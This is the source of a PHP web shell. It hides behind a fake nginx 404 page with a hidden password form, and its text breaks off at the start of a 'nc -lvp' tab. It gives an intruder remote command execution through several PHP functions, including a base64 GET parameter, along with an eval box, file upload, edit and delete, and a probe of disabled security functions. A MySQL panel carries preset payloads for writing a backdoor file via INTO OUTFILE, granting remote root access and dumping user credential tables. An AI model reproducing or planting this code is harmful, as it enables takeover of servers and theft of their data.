<?php
error_reporting(0);
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0");
header("Pragma: no-cache");
header("Content-type: text/html; charset=utf-8");
?>

<!--legion Start--->
<?php 
session_start();
error_reporting(0);
if(isset($_POST['password'])) {
$password=$_POST['password'];
$_SESSION["P1ssw0rd"]=$password;
}
if($_SESSION["P1ssw0rd"]!="admin")
    {  
        echo "
		<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
<style>
		input { margin:0;background-color:#fff;border:1px solid #fff; }
		</style>
		<center>
		<br/><br/><br/><br/>
		<form method=post>
		<input type=password name=password>
		</form></center>
</body>
</html>
		";
exit;
}

?>
<!--legion end--->

<?php
error_reporting(0);
if(isset($_GET['Logout'])){
	$Url =  $_SERVER['PHP_SELF'];
    unset($_SESSION['P1ssw0rd']);
	header("location:$Url");
}
if($_GET['cmd']){
	system(base64_decode($_GET['cmd']." 2>&1"));
	exit;
}

if(is_file($_POST['wd'])){
	ob_start();
	$f = $_POST['wd'];
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($f).'"');
	header('Content-Length: ' . filesize($f));   
	readfile($f);
	ob_end_flush(); 
	exit;
}
ini_set('default_charset', 'utf-8');

function rm($target) { 
	if(is_file($target)){
		chmod($target, 0777);
		unlink($target);
		return;
	}
	if (is_dir($target)) { 
    	$objects = scandir($target); 
		foreach ($objects as $object) { 
			if ($object != "." && $object != "..") { 
	         	rm($target."/".$object); 
			} 
		}
		chmod($target, 0777);
		rmdir($target); 
   } 
}
function human_filesize($bytes, $decimals = 0) {
  $sz = 'BKMGTP';
  $factor = floor((strlen($bytes) - 1) / 3);
  return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) ."&nbsp;<b>". @$sz[$factor]."</b>";
}
// clean magic_quotes_gpc
if(get_magic_quotes_gpc()){
    foreach($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}
    foreach($_COOKIE as $k=>$v){$_COOKIE[$k] = stripslashes($v);}
}
$DS = DIRECTORY_SEPARATOR;
$tab = $_COOKIE['tab'] ? $_COOKIE['tab'] : 'file';
$cmd = $_POST['cmd']; $execfn = $_COOKIE['execfn'] ? $_COOKIE['execfn'] : 'shell_exec';
$code = $_POST['code'];
$edit = $_POST['edit'];
if($_POST['rm']){rm($_POST['rm']);}
$wd = $_POST['wd'] ? $_POST['wd'] : ($_COOKIE['wd'] ? $_COOKIE['wd'] : getcwd());
if(!is_dir($wd) || !chdir($wd)){$wd = getcwd();}
if(substr($wd, -1)!=$DS){$wd.=$DS;}
setcookie("wd", $wd);
if($edit && $_POST['save']){
	file_put_contents($edit, $_POST['content']);
}
if($_FILES['file']){
	move_uploaded_file($_FILES['file']['tmp_name'], $wd.$DS.$_FILES['file']['name']);
}

$crossmark2c3e50 = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAgVBMVEUAAAAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlCBliHiAAAAKnRSTlMAAQIFBw0QERIUHSMoKSorLTQ1NztOUVteYWJjZGhtfpirxdrk6Onr8f2CYgeMAAAAj0lEQVQYV13PRxKCUAAE0RZETJjACAZMwNz/gC5+LGf5NlMNsyojLC0XQCUNW2/5R7rDS5J2zjpJSnkq6KSTpCFhPng1pgNQOLV2AWBl9PiNzKskqbYWa+MN1lZjI+8NlrGZX4WK2P7b9AgV3hqWQTNjNTjdQOvNaT/iLYU2o2NOks7WjLZAeSu8wfS6T/gBZvkhrW2zAmIAAAAASUVORK5CYII=';
$crossmarkc0392b = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAgVBMVEUAAADAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvLmoxzAAAAKnRSTlMAAQIFBw0QERIUHSMoKSorLTQ1NztOUVteYWJjZGhtfpirxdrk6Onr8f2CYgeMAAAAj0lEQVQYV13PRxKCUAAE0RZETJjACAZMwNz/gC5+LGf5NlMNsyojLC0XQCUNW2/5R7rDS5J2zjpJSnkq6KSTpCFhPng1pgNQOLV2AWBl9PiNzKskqbYWa+MN1lZjI+8NlrGZX4WK2P7b9AgV3hqWQTNjNTjdQOvNaT/iLYU2o2NOks7WjLZAeSu8wfS6T/gBZvkhrW2zAmIAAAAASUVORK5CYII=';
$edit2c3e50 ='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAeFBMVEUAAAAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlAsPlBbWtZNAAAAJ3RSTlMAAQIDBAkKCxASFBgiMEVXX2ZnaGlrbG1wkaCiqrm6vMfa3N7g4uidnb/yAAAAeklEQVQYV23QNxICMRQE0cEsYgEBwpuFRbi+/w1JCL5Mh69qkpGS3OM6Upb7wD3XM0A/sNTc2g7AWYvEtoOTtScQ264wiI2xyQsAQsU2FdtWbGftXZqr2PC/3RvTwgNwsKZv8IVNIXiOiWkJrGep6dKv5smBkjTOQdIPvUQRFk3RNyMAAAAASUVORK5CYII=';
$editc0392b = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAeFBMVEUAAADAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSvAOSus/4B3AAAAJ3RSTlMAAQIDBAkKCxASFBgiMEVXX2ZnaGlrbG1wkaCiqrm6vMfa3N7g4uidnb/yAAAAeklEQVQYV23QNxICMRQE0cEsYgEBwpuFRbi+/w1JCL5Mh69qkpGS3OM6Upb7wD3XM0A/sNTc2g7AWYvEtoOTtScQ264wiI2xyQsAQsU2FdtWbGftXZqr2PC/3RvTwgNwsKZv8IVNIXiOiWkJrGep6dKv5smBkjTOQdIPvUQRFk3RNyMAAAAASUVORK5CYII=";
?>
<html>
<head>
<title>National Security Agency 701s Pings </title>
<meta http-equiv="Content-type" content="text/html; charset=utf-8"/>
<style>
/*credit https://gist.github.com/fredsted/7147450*/
body{width: 1200px;margin: auto;margin-top: 15px;}
/*::-webkit-scrollbar {
    width: 0px;background: transparent;
}*/
* {font-size: 13px;font-family: "roboto mono";}
.hidden {display: none}
div.toggle {padding: 0 5;} div.toggle:hover img {display: none;} div.toggle:hover img.hidden {display: block;}
input[type="submit"]:active, button:active, .active{
 	background: #ddd !important;	
}
div.tab {position: absolute;visibility: hidden;width: 1200px}
textarea, input[type="text"], input[type="button"], input[type="submit"]{
	-moz-appearance: none;-webkit-appearance: none;
	resize: none;width: 100%;border-radius: 3px;
	border: 1px solid #c0c0c0;padding: 3px;
}
input[type="radio"] {position: relative;top: 2px;}
input:focus,textarea:focus{outline: none;}
span.tab-btn, button, input[type="button"], input[type="submit"]{
	border-radius: 3px;
	border: 1px solid #c0c0c0;color: #000;
	display: inline-block;padding: 4px;
	-moz-appearance: none;-webkit-appearance: none;
	text-decoration: none;
	color: black;
	font-size: 13px;
	padding: 1px 7px;
	border:1px solid #9C9C9C;
	display: inline-block;
	background-image: -webkit-linear-gradient(
	#ffffff 0%, #F6F6F6 	30%, 
	#F3F3F3 45%, #EDEDED 	60%, 
	#eeeeee 100%);
	border-radius: 3px;
	cursor: default;
	box-shadow: 0px 0px 1px rgba(0,0,0,0.20);
}
td  {border: 1px solid #c0c0c0; border-collapse: collapse;height: 20px;}
td > div > img {width: 10px; height: 10px}
td > div, td > span {
  padding-right: 3px;
  float: right;
  height: 100%;
  display:flex;
  flex-direction:column;
  justify-content:center;
}
tr:nth-child(2n){background-color: #f4f4f9;}
tr:hover td{background: #ddd;}
td > span {float: left;} 
tr td:nth-child(2), tr td:nth-child(3),tr td:nth-child(4) {text-align: center;}
//kill
.new{margin-right:15px;}
.content{border:1px solid var(--border-color);padding:10px;overflow:auto;overflow-y:hidden}
#php{display:inline-block}
	.php-left{float:left;width:49%}
	.php-right{float:right;width:49%}
	
</style>
<script type="text/javascript">
    function $(ID) {
    return document.getElementById(ID);
}
	var xhr;
	window.onload=function(){
		getFocus("terminal-input");
		getFocus("find-action");
		getFocus("sourcefocus");
		getFocus("php-code");
	};

	function getFocus(id){
		if(document.getElementById(id)!==null){
		document.getElementById(id).focus();}
	}
	function getAjax(txt,id,method,url){
		var xmlhttp;
		var urlf="";
		var data=new FormData();
		var params=url.split("&");
		for(i=0;i<params.length;i++){
		val=params[i].split("=");
		if(val[0]=='text-encode'){
		data.append(val[0],val[1]);
		}else{if(val[0].indexOf('?')<0)
		{urlf+='&'+val[0]+'='+val[1];}}}
		if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();
		}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
		xmlhttp.onreadystatechange=function(){
		sts=["Request Not Initialized",
		"Server Connection Established",
		"Request Received",
		"Processing Request",
		"Request Finished"];
		if(xmlhttp.readyState==4&&xmlhttp.status==200){
		if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
		}else{document.getElementById(id).value=xmlhttp.responseText;}
		}else{
		if(txt){document.getElementById(id).innerHTML=
		"[Status] "+"Please Wait... <div class='loading'></div><br>"+
		"[State] "+sts[xmlhttp.readyState]+"<br>"+
		"[Response] "+xmlhttp.response;
		}else{document.getElementById(id).value=
		"[Status] "+"Please Wait...\n"+
		"[State] "+sts[xmlhttp.readyState]+"\n"+
		"[Response] "+xmlhttp.response;}}
		};
		xmlhttp.open(method,window.location.href+urlf,true);
		xmlhttp.send(data);
		xhr=xmlhttp;
	}
	function ajaxAbort(txt,id){
		if(txt){document.getElementById(id).innerHTML="Canceled";
		}else{document.getElementById(id).value="Canceled";}
		xhr.abort();
	}
	function checkAll(){
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
		document.getElementsByName('chk[]')[i].checked=document.getElementsByName('check-all')[0].checked;}
	}
	function checkCount(id){
		count=1;
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
		if(document.getElementsByName('chk[]')[i].checked){
		document.getElementById(id).innerHTML=count++;
		}else{document.getElementById(id).innerHTML=count-1;}}
	}
	function mapSwitch(id,id2){
		var a=document.getElementById(id);
		var b=document.getElementById(id2);
		if(a.style.display=='inline-block'){
		a.style.display='none';
		b.style.display='inline-block';
		}else{a.style.display='inline-block';
		b.style.display='none';}
	}
	function getParameter(p) {
		var searchString=window.location.search.substring(1),
		i,val,params=searchString.split("&");
		for(i=0;i<params.length;i++){
		val=params[i].split("=");
		if(val[0]==p){
		return val[1];}}
		return null;
	}
</script>
</head>
<body>
<div style="margin-bottom: 14px;position: relative;">
	<?php
	foreach(array('&#9733; info', '&frac12; Sec', 'PHPinfo', '&#9822; file', 'edit', 'PHP', 'exec', 'eval', 'Mysql', 'nc -lvp', 'Kill Ps','UpFile','UpFile2') as $fn) {
		echo "<span onclick=\"showTab('$fn', this)\" class=\"tab-btn ".($tab==$fn ? 'active' : '')."\">$fn</span> ";
	}
        echo "<button onclick=window.location.href='?Logout'>Logout</button>";
	function any($x,$y)
{
	return array_key_exists($x,$y);
}
function Unix() 
{
	return(strtolower(substr(PHP_OS,0,3))!="win");
}
function Execute($x)
{
	$x=$x.' 2>&1';
	if(!is_null($backtic=`$x`))
	{
		return $backtic;
	}
	elseif(function_exists('system'))
	{
		ob_start();
		$system=system($x);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec'))
	{
		$buff="";
		exec($x,$results);
		foreach($results as $result)
		{
			$buff.=$result;
		}
		return $buff;
	}
	elseif(function_exists('shell_exec'))
	{
		$buff=shell_exec($x);
		return $buff;
	}
	elseif(function_exists('pcntl_exec'))
	{
		$buff=pcntl_exec($x);
		return $buff;
	}
	elseif(function_exists('passthru'))
	{
		ob_start();		
		$passthru=passthru($x);
		$buff=ob_get_contents();
		ob_end_clean();	
		return $buff;
	}
	elseif(function_exists('proc_open'))
	{
		$proc=proc_open($x,array(
			array("pipe","r"),
			array("pipe","w"),
			array("pipe","w")
		),$pipes);
		$buff=stream_get_contents($pipes[1]);
		return $buff;
	}
	elseif(function_exists('popen'))
	{
		$buff="";
		$pop=popen($x,"r");
		while(!feof($pop))
		{
			$buff.=fread($pop,1024);
		}
		pclose($pop);
		return $buff;
	}
	return "R.I.P Command";
}
	?>
</div>

<!--info Start--->
<div class="tab" data-tab="&#9733; info" <?php echo $tab=='&#9733; info' ? 'style="visibility: visible"' : ''?>>
	<div style="margin-top: 0px;">
	<?php echo "OS : ".php_uname()."<br>USER : ".get_current_user()."<br>PHP : ".PHP_VERSION."<br>DATETIME : ".date("d.m.Y H:i:s");?>
	</div>
</div>
<!--info End--->
<!--Sec Start--->
<div class="tab" data-tab="&frac12; Sec" <?php echo $tab=='&frac12; Sec' ? 'style="visibility: visible"' : ''?>>
	<div style="margin-top: 0px;">
	<?php
		$disable_functions=array_filter(array_map('trim',explode(',',ini_get("disable_functions"))));

		$security=array('_xyec','allow_url_fopen','allow_url_include','apache_child_terminate','apache_get_modules','apache_getenv',
		'apache_note','apache_setenv','base64_decode','chdir','chgrp','chmod','chown','curl_exec','curl_multi_exec','dbase_open',
		'dbmopen','define_syslog_variables','disk_free_space','disk_total_space','diskfreespace','dl','dlopen','escapeshellarg',
		'escapeshellcmd','eval','exec','extract','filepro','filepro_retrieve','filepro_rowcount','fopen_with_path','fp','fput',
		'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open',
		'get_cfg_var','get_current_user','get_num_redirects','getcwd','getenv','getlastmo','getmygid','getmyinode','getmypid',
		'getmyuid','getrusage','gzinflate','gzuncompress','highlight_file','hpAds_xmlrpcEncode','ini_alter','ini_get_all',
		'ini_restore','ini_set','inject_code','leak','link','listen','mainwork','mb_send_mail','mkdir','mkfifo','move_uploaded_file',
		'mysql_list_dbs','mysql_pconnect','openlog','parse_ini_file','passthru','pcntl_alarm','pcntl_exec','pcntl_fork',
		'pcntl_get_last_error','pcntl_getpriority','pcntl_setpriority','pcntl_signal','pcntl_signal_dispatch','pcntl_sigprocmask',
		'pcntl_sigtimedwait','pcntl_sigwaitinfo','pcntl_strerrorp','pcntl_wait','pcntl_waitpid','pcntl_wexitstatus','pcntl_wifexited',
		'pcntl_wifsignaled','pcntl_wifstopped','pcntl_wstopsig','pcntl_wtermsig','pfsockopen','phpAds_XmlRpc','phpAds_remoteInfo',
		'phpAds_xmlrpcDecode','phpAds_xmlrpcEncode','php_uname','phpinfo','popen','posix_getgrgid','posix_getlogin','posix_getpwuid',
		'posix_kill','posix_mkfifo','posix_setpgid','posix_setsid','posix_setuid','posix_ttyname','posix_uname','posixc','proc_close',
		'proc_get_stats','proc_get_status','proc_nice','proc_open','proc_terminate','ps_aux','putenv','readlink','rename','rmdir',
		'runkit_function_rename','set_time_limit','sh2_exec','shell_exec','show_source','sleep','socket_accept','socket_bind',
		'socket_clear_error','socket_close','socket_connect','socket_create','socket_create_listen','socket_create_pair',
		'socket_get_option','socket_getpeername','socket_getsockname','socket_last_error','socket_listen','socket_read',
		'socket_recv','socket_recvfrom','socket_select','socket_send','socket_sendto','socket_set_block','socket_set_nonblock',
		'socket_set_option','socket_shutdown','socket_strerror','socket_write','str_rot13','stream_select','stream_socket_server',
		'symlink','syslog','system','tp_exec','virtual','xmlrpc_entity_decode');

		sort($security); 
		$fucks=array_unique(array_merge($disable_functions,$security));
		$table="";
		$enable=0;
		$disable=0;
		$die=array();
		$ready=array();
		$off=array();
		$total=count($fucks);

		foreach($fucks as $fuck)
		{
			$table.="<tr><td></td><td>$fuck</td><td>";
			if(in_array($fuck,$disable_functions))
			{
				$table.="<center><font color=red>DIE</font></center>";
				$die[]=$fuck;
				$disable++;
			}
			else
			{
				if(function_exists($fuck)||is_callable($fuck))
				{
					$table.="<center><font color=green>READY</font></center>";
					$ready[]=$fuck;
					$enable++;
				}
				else
				{
					$table.="<center><font color=orange>OFF</font></center>";
					$off[]=$fuck;
					$disable++;
				}
			}
			$table.="</td></tr>";
		}

		$risk=($enable/$total)*100;
		$secure=($disable/$total)*100;

		printf("<h2 style='text-align:center'>Sec. Info v2.0.%s</h2><br>
			<h4 style='text-align:center;color:var(--txt-color)'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=green>[%s%%]</font></h4><br><br>
			<div class='auto-number'>
				<table class='table sortable'>
					<thead>
						<tr>
							<th class='sorttable_nosort' width='15'>No.</th>
							<th>Disable Function</th>
							<th>Status</th>
						</tr>
					</thead>
					<tbody>
						%s
					</tbody>
				</table>
				<fieldset style='margin-bottom:15px'>
					<legend>Ready List</legend>
					<textarea>%s</textarea>
				</fieldset>
				<div class='divide'>
					<div class='divide-left'>
						<fieldset style='margin-bottom:15px'>
							<legend>Off List</legend>
							<textarea>%s</textarea>
						</fieldset>
					</div>
					<div class='divide-right'>
						<fieldset>
							<legend>Die List</legend>
							<textarea>%s</textarea>
						</fieldset>
					</div>
			</div>",$total,round($risk,2),round($secure,2),$table,implode($ready, ', '),implode($off, ', '),implode($die, ', '));
	
	?>
	</div>
	</div>
</div>
<!--Sec End--->
<!--PHPinfo Start--->
<div class="tab" data-tab="PHPinfo" <?php echo $tab=='PHPinfo' ? 'style="visibility: visible"' : ''?>>
	<?php phpinfo();?>
</div>
<!--PHPinfo End--->
<!--File Start--->
<div class="tab" data-tab="&#9822; file" <?php echo $tab=='&#9822; file' ? 'style="visibility: visible"' : ''?>>
	<form method="POST" enctype="multipart/form-data" id="fileForm" accept-charset="UTF-8">
		<input type="hidden" id="rm" name="rm">
		<input type="file" name="file" id="file" style="display: none;">
		<input type="text" name="wd" id="wd" value="<?php echo $wd;?>" autocomplete="off"/>
	</form>
	<table style="width: 100%;border: 1px solid #c0c0c0">
		<?php 
		$dirs = array(); $files = array(); $others = array();
		foreach(array_diff(scandir($wd), array('.')) as $i){
			if(is_dir($i)) {
				array_push($dirs, $i);
			}
			else if(is_file($i)) {
				array_push($files, $i);
			}
			else {
				array_push($others, $i);
			}
		}
		foreach ($dirs as $dir ) {
			echo "<tr style='cursor: pointer;background: #ffffcc;'>
			<td width=900 onclick=\"if(window.getSelection().type == 'Range') return;wd.value='".addslashes(realpath($wd.$dir))."';fileForm.submit();\">
			<span>$dir</span>
			<div class='toggle' onclick=\"del('".addslashes(realpath($wd.$dir))."', event)\">".($dir!='..' ? "<img src=\"$crossmark2c3e50\"/><img class='hidden' src=\"$crossmarkc0392b\"/>" : '')."</div></td>
			<td nowrap width=100>".date("d.m.Y", filectime($dir))."</td>
			<td nowrap width=100>".date("d.m.Y", filemtime($dir))."</td>
			<td width=100></td>
			</tr>\n";
		}
		foreach ($files as $file ) {
			echo "<tr style='cursor: pointer;'>
			<td width=900 onclick=\"if(window.getSelection().type == 'Range') return;wd.value='".addslashes(realpath($wd.$file))."';fileForm.submit();wd.value='".addslashes($wd)."'\">
				<span>$file</span>
				<div class='toggle' onclick=\"del('".addslashes(realpath($wd.$file))."', event)\">
					<img src=\"$crossmark2c3e50\"/>
					<img class='hidden' src=\"$crossmarkc0392b\"/>
				</div>
				<div class='toggle' onclick=\"edit('".addslashes(realpath($wd.$file))."', event)\">
					<img src=\"$edit2c3e50\"/>
					<img class='hidden' src=\"$editc0392b\"/>
				</div>
			</td>
			<td nowrap width=100>".date("d.m.Y", filectime($file))."</td>
			<td nowrap width=100>".date("d.m.Y", filemtime($file))."</td>
			<td width=100>".(filesize($file)>=0 ? human_filesize(filesize($file)) : '')."</td>
			</tr>\n";
		}
		foreach ($others as $other ) {
		echo "<tr style='cursor: not-allowed;'><td colspan='4'>$other</td></tr>";
		}
		?>
	</table>
</div>
<!--File End--->
<!--Edit Start--->
<div class="tab" data-tab="edit" <?php echo $tab=='edit' ? 'style="visibility: visible"' : ''?>>
	<form method="POST" id="editForm" accept-charset="UTF-8">
		<input type="text" name="edit" id="edit" value="<?php echo str_replace(array('"', '\''), array('', ''), $edit);?>" autocomplete="off"/>
		<?php if($edit && is_file($edit)) {?>
			<textarea style="margin-top: 13px" rows="30" name="content"><?php echo htmlentities(file_get_contents($edit))?></textarea><br><br>
			<input type="submit" name="" value="" style="display: none">
			<input type="submit" name="save" value="save">
		<?php }?>
	</form>
</div>
<!--Edit End--->
<!--Exec Start--->
<div class="tab" data-tab="exec" <?php echo $tab=='exec' ? 'style="visibility: visible"' : ''?>>
	<form method="POST" id="execForm" accept-charset="UTF-8">
		<input type="text" name="cmd" value="<?php echo str_replace(array('"', '\''), array('&quot;', '&apos;'), $cmd);?>" autocomplete="off" />
		<div style="padding-top: 5px">
			<?php
			foreach (array("shell_exec", "system", "popen") as $fn) {
				echo "<input type='radio' name='execfn' value='$fn' onclick='setexecfn(this.value)' ".($execfn==$fn ? 'checked' : '')."><span onclick='this.previousElementSibling.click()'>$fn</span>\n";
			}
			?>
		</div>
	</form>
	<?php
	if($cmd){
		if($execfn=="shell_exec"){
			echo "<textarea readonly style='border: none;'>";
			echo htmlentities(shell_exec($cmd." 2>&1"));
			echo "</textarea>";
		}
		if($execfn=="system"){
			echo "<textarea readonly style='border: none;'>";
			ob_start(); 
			system($cmd." 2>&1");
			echo htmlentities(ob_get_clean());
			echo "</textarea>";
		}
		if($execfn=="popen"){
			echo "<textarea readonly style='border: none;'>";
			$ph = popen($cmd." 2>&1", 'r');
			while($output = fgets($ph)){
				echo htmlentities($output);
			}
			pclose($ph);
			echo "</textarea>";
		}
	} 
	?>
</div>
<!--Exec End--->
<!--Eval Start--->
<div class="tab" data-tab="eval" <?php echo $tab=='eval' ? 'style="visibility: visible"' : ''?>> 
	<form method="POST" id="evalForm" accept-charset="UTF-8">
		<textarea name="code" rows="5"><?php if($code){echo htmlentities($code);} else {echo "echo file_get_contents('http://ip-api.com/line');";}?></textarea><br><br>
		<input type="submit" value="eval">
	</form>
	<?php if($code) {?><textarea readonly style='border: none;'><?php eval($code);?></textarea> <?php }?>
</div>
<!--Eval End--->
<!--Mysql Start--->
<div class="tab" data-tab="Mysql" <?php echo $tab=='Mysql' ? 'style="visibility: visible"' : ''?>>
<?php
if ((!empty($_POST['sqlhost'])) && (!empty($_POST['sqluser'])) && (!empty($_POST['names']))) {
            $type = $_POST['type'];
            $sqlhost = $_POST['sqlhost'];
            $sqluser = $_POST['sqluser'];
            $sqlpass = $_POST['sqlpass'];
            $sqlname = $_POST['sqlname'];
            $sqlcode = $_POST['sqlcode'];
            $names = $_POST['names'];
            switch ($type) {

                case "MySql":
                    if (function_exists('mysql_close')) {
                        $conn = mysql_connect(strstr($sqlhost, ':') ? $sqlhost : $sqlhost . ':3306', $sqluser, $sqlpass, $sqlname);
                        if ($conn) {
                            $msg = '<h2>连接' . $type . '成功 </h2>';
                            if (substr($sqlcode, 0, 7) == 'a') {
                                $array = array();
                                $data = '';
                                $i = 0;
                                preg_match_all('/a\s*\'(.*)\'\s*b\s*\'(.*)\'\s*c\s*\'(.*)\'\s*file\s*\'(.*)\'/i', $sqlcode, $array);
                                if ($array[1][0] && $array[2][0] && $array[3][0] && $array[4][0]) {
                                    mysql_select_db($array[1][0], $conn);
                                    mysql_query('set names ' . $names, $conn);
                                    $spidercode = 'select ' . $array[3][0] . ' from `' . $array[2][0] . '`;';
                                    $result = mysql_query($spidercode, $conn);
                                    if ($result) {
                                        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
                                            $data.= join(' |x| ', $row) . "\r\n";
                                            $i++;
                                        }
                                        if ($data) {
                                            $file = strdir($array[4][0]);
                                            $msg.= filew($file, $data, 'w') ? '<h2> - 脱库成功</h2>' : '<h1> - 导出文件失败</h1>';
                                            $rows = array(
                                                'file' => $file,
                                                size(filesize($file)) => '共获取' . $i . '条数据'
                                            );
                                        } else {
                                            $msg.= '<h1> - 没有数据</h1>';
                                        }
                                    } else {
                                        $msg.= '<h1> - 执行SQL失败</h1>';
                                        $rows = array(
                                            'errno' => mysql_errno() ,
                                            'error' => mysql_error()
                                        );
                                    }
                                } else {
                                    $msg.= '<h1> - 脱库语句错误</h1>';
                                }
                            } elseif (!empty($sqlcode)) {
                                mysql_select_db($sqlname, $conn);
                                mysql_query('set names ' . $names, $conn);
                                $result = mysql_query($sqlcode, $conn);
                                if ($result) {
                                    $msg.= '<h2> - 执行SQL成功</h2>';
                                    while ($array = mysql_fetch_array($result, MYSQL_ASSOC)) {
                                        $rows[] = $array;
                                    }
                                } else {
                                    $msg.= '<h1> - 执行SQL失败</h1>';
                                    $rows = array(
                                        'errno' => mysql_errno() ,
                                        'error' => mysql_error()
                                    );
                                }
                            }
                            mysql_free_result($result);
                        } else {
                            $msg = '<h1>连接' . $type . '失败</h1>';
                            $rows = array(
                                'errno' => mysql_errno() ,
                                'error' => mysql_error()
                            );
                        }
                        mysql_close($conn);
                    } else {
                        $msg = '<h1>不支持' . $type . '</h1>';
                    }
                    break;
            }
        } else {
            $type = 'MySql';
            $sqlhost = 'localhost:3306';
            $sqluser = 'root';
            $sqlpass = '123456';
            $sqlname = 'mysql';
            $sqlcode = 'select version();';
            $names = 'gbk';
        }
   echo '<div class="Mysql">' . $msg . '</div>';
        echo '<form method="POST">';
        echo '<input type="hidden" name="go" id="go" value="sql">';
        echo '<center><table class="tables"><tr><th style="width:20%;">名称</th><th>设置</th></tr>';
        echo '<tr><td>支持类型</td><td>';
        $dbs = array(
            'MySql',
        );
        foreach ($dbs as $dbname) {
            echo '<label><input type="radio" name="type" value="' . $dbname . '"' . ($type == $dbname ? ' checked' : '') . '>' . $dbname . '</label> ';
        }
        echo '</td></tr><tr><td>连接</td><td>地址 <input type="text" name="sqlhost" style="width:200px;" value="' . $sqlhost . '"> ';
        echo '用户 <input type="text" name="sqluser" style="width:100px;" value="' . $sqluser . '"> ';
        echo '密码 <input type="text" name="sqlpass" style="width:100px;" value="' . $sqlpass . '"> ';
        echo '库名 <input type="text" name="sqlname" style="width:100px;" value="' . $sqlname . '"></td></tr>';
        echo '<tr><td>';
        echo '<select onchange="$(\'sqlcode\').value=options[selectedIndex].value">';
        echo '<option value="select version();">---语句集合---</option>';
        echo '<option value="select \'<?php eval ($_POST[cmd]);?>\' into outfile \'D:/web/shell.php\';">写入文件</option>';
        echo '<option value="GRANT ALL PRIVILEGES ON *.* TO \'' . $sqluser . '\'@\'%\' IDENTIFIED BY \'' . $sqlpass . '\' WITH GRANT OPTION;">开启外连</option>';
        echo '<option value="show variables;">系统变量</option>';
        echo '<option value="create database 05;">创建数据库</option>';
        echo '<option value="create table `05` (`id` INT(10) NOT NULL ,`user` VARCHAR(32) NOT NULL ,`pass` VARCHAR(32) NOT NULL) TYPE = MYISAM;">创建数据表</option>';
        echo '<option value="show databases;">显示数据库</option>';
        echo '<option value="show tables from `' . $sqlname . '`;">显示数据表</option>';
        echo '<option value="show columns from `05`;">显示表结构</option>';
        echo '<option value="drop table `05`;">删除数据表</option>';
        echo '<option value="select username,password,salt,email from `pre_ucenter_members` limit 0,30;">显示字段</option>';
        echo '<option value="insert into `admin` (`user`,`pass`) values (\'05\', \'f1a81d782dea6a19bdca383bffe68452\');">插入数据</option>';
        echo '<option value="update `admin` set `user` = \'051\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'05\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">修改数据</option>';
        echo '<option value="05a \'discuzx25\' 05b \'pre_ucenter_members\' 05c \'username,password,salt,email\' 05file \'' . THISDIR . 'out.txt\';">脱库(MySql)</option>';
        echo '</select>';
        echo '<td>Payload:
        <textarea name="sqlcode" id="sqlcode" style="width:550px;height:60px;vertical-align:middle;">' . htmlspecialchars($sqlcode) . '</textarea></td></tr>';
        echo '<tr><td>操作</td><td><select name="names">';
        $charsets = array(
            'gbk',
            'utf8',
            'big5',
            'latin1',
            'cp866',
            'ujis',
            'euckr',
            'koi8r',
            'koi8u'
        );
        foreach ($charsets as $charset) {
            echo '<option value="' . $charset . '"' . ($names == $charset ? ' selected' : '') . '>' . $charset . '</option>';
        }
        echo '</select> <input type="submit" style="width:80px;" value="执行"></td></tr>';
        echo '</table></form>';
        if ($rows) {
            echo '<pre style="padding:5px;background:#F8F8F8;text-align:left;">';
            ob_start();
            print_r($rows);
            $out = ob_get_contents();
            ob_end_clean();
            if (preg_match('~[\x{4e00}-\x{9fa5}]+~u', $out) && function_exists('iconv')) {
                $out = @iconv('UTF-8', 'GB2312//IGNORE', $out);
            }
            echo '</br>'.htmlspecialchars($out);
            echo '</pre>';
        }
?>
</div>
<!--Mysql End--->

<!--nc -lvp Start--->
<div class="tab" data-tab="nc -lvp" <?php echo $tab=='nc -lvp' ? 'style="visibility: visible"' : ''?>>

<?php
header("content-Type: text/html; charset=utf-8");
function strdir($str) {
	return str_replace(array(
